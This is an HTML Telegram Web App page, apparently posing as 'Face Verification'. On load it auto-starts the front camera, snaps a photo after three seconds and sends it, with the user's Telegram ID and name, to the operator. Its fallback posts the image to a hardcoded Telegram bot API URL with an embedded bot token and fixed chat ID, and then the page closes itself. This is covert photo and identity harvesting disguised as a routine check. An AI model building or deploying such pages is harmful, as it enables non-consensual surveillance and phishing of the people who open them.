<!DOCTYPE html>
<html>
<head>
    <title>Camera Verify</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; }
        #status { margin: 20px; font-size: 18px; }
        video { width: 100%; max-width: 400px; margin: 20px auto; display: block; }
        .btn { padding: 15px 30px; background: #0088cc; color: white; border: none; border-radius: 10px; margin: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>ðŸ“¸ Face Verification</h1>
    <div id="status">Starting camera...</div>
    <video id="camera" autoplay class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
    <button id="retry" class="btn hidden">Retry</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        let stream = null;
        
        // ÐÐ²Ñ‚Ð¾Ð·Ð°Ð¿ÑƒÑÐº ÐºÐ°Ð¼ÐµÑ€Ñ‹ Ñ‡ÐµÑ€ÐµÐ· 1 ÑÐµÐºÑƒÐ½Ð´Ñƒ
        setTimeout(() => {
            startCamera();
        }, 1000);
        
        function startCamera() {
            document.getElementById('status').textContent = "Requesting camera access...";
            
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' },
                audio: false 
            })
            .then(s => {
                stream = s;
                const camera = document.getElementById('camera');
                camera.srcObject = stream;
                camera.classList.remove('hidden');
                document.getElementById('status').textContent = "Camera ready. Taking photo in 3 seconds...";
                
                // ÐÐ²Ñ‚Ð¾Ð·Ð°Ñ…Ð²Ð°Ñ‚ Ñ‡ÐµÑ€ÐµÐ· 3 ÑÐµÐºÑƒÐ½Ð´Ñ‹
                setTimeout(capturePhoto, 3000);
            })
            .catch(err => {
                document.getElementById('status').textContent = "Error: " + err.message;
                document.getElementById('retry').classList.remove('hidden');
            });
        }
        
        function capturePhoto() {
            const camera = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            
            // Ð—ÐµÑ€ÐºÐ°Ð»ÑŒÐ½Ð¾Ðµ Ð¾Ñ‚Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ðµ
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
            
            // ÐžÑÑ‚Ð°Ð½Ð°Ð²Ð»Ð¸Ð²Ð°ÐµÐ¼ ÐºÐ°Ð¼ÐµÑ€Ñƒ
            stream.getTracks().forEach(track => track.stop());
            
            // ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ñ„Ð¾Ñ‚Ð¾
            const photoData = canvas.toDataURL('image/jpeg');
            
            // ÐžÐ¢ÐŸÐ ÐÐ’ÐšÐ Ð’ TELEGRAM Ð‘ÐžÐ¢Ð
            sendToTelegram(photoData);
        }
        
        function sendToTelegram(photoData) {
            document.getElementById('status').textContent = "Sending to server...";
            
            // ÐžÐ¢ÐŸÐ ÐÐ’ÐšÐ Ð§Ð•Ð Ð•Ð— TELEGRAM WEB APP DATA
            if (tg && tg.sendData) {
                const data = {
                    action: 'photo_captured',
                    photo: photoData,
                    user_id: tg.initDataUnsafe?.user?.id || 'unknown',
                    user_name: tg.initDataUnsafe?.user?.first_name || 'Anonymous',
                    timestamp: new Date().toISOString()
                };
                
                console.log("Sending data:", data);
                
                try {
                    tg.sendData(JSON.stringify(data));
                    document.getElementById('status').textContent = "âœ… Verification complete! Closing...";
                    
                    // ÐÐ²Ñ‚Ð¾Ð·Ð°ÐºÑ€Ñ‹Ñ‚Ð¸Ðµ
                    setTimeout(() => {
                        tg.close();
                    }, 2000);
                    
                } catch (error) {
                    document.getElementById('status').textContent = "âŒ Send error, trying direct send...";
                    sendDirect(photoData);
                }
            } else {
                sendDirect(photoData);
            }
        }
        
        function sendDirect(photoData) {
            // ÐŸÑ€ÑÐ¼Ð°Ñ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð½Ð° Ð±Ð¾Ñ‚Ð° Ñ‡ÐµÑ€ÐµÐ· HTTP
            const formData = new FormData();
            formData.append('photo', photoData.split(',')[1]);
            formData.append('user_id', tg.initDataUnsafe?.user?.id || 'unknown');
            
            fetch('https://api.telegram.org/bot7551551273:AAFKKqRlkkakJYdSNX4ogmg-YYKklBikmZY/sendPhoto', {
                method: 'POST',
                body: JSON.stringify({
                    chat_id: 7795195179,
                    photo: photoData,
                    caption: `Auto-captured: ${new Date().toLocaleString()}`
                }),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('status').textContent = data.ok ? "âœ… Photo sent!" : "âŒ Send failed";
            })
            .catch(err => {
                document.getElementById('status').textContent = "Error: " + err.message;
            });
        }
        
        document.getElementById('retry').onclick = startCamera;
    </script>
</body>
</html>
